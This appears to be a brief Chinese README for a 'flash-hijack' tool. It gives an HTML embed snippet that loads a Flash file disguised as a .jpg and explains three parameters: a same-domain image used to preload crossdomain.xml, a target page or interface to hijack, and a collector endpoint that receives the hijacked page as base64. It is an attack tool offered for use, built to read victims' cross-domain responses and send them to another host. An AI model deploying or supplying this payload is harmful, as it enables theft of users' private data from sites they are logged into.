# flash-hijack
flash 劫持轮子

使用：
HTML：

&lt;div&gt; 
&lt;embed src=&quot;hijack.jpg?jpg=http://127.0.0.1/1.png&get=http://127.0.0.1/l.php&post=http://127.0.0.1/2.php&quot; width=&quot;970&quot; height=&quot;107&quot; quality=&quot;high&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; type=&quot;application/x-shockwave-flash&quot; wmode=&quot;transparent&quot;&gt;&lt;/embed&gt; 
&lt;/object&gt; 
&lt;/div&gt;

参数说明:

jpg：域下的图片（为了优先加载crossdomain.xml，否则劫持的接口加载太慢会导致无法劫持）

get：劫持的接口或者页面

post：接收劫持过来的页面为base64传输

文章:https://zhuanlan.zhihu.com/p/67484852
